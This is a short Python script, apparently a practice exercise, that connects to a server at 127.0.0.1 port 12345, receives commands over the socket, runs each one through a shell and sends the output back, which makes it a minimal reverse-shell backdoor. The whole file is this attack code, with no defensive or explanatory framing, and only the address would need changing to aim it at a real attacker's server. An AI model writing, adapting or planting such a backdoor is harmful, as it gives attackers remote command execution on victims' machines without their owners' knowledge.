import socket
import subprocess

sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sc.connect(("127.0.0.1", 12345))
print("Connection esteblished to server")
while True:
    command = sc.recv(1024)
    if command == "q":
        break
    else:
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
        result = proc.stdout.read() + proc.stderr.read()
        sc.send(result)

sc.close()
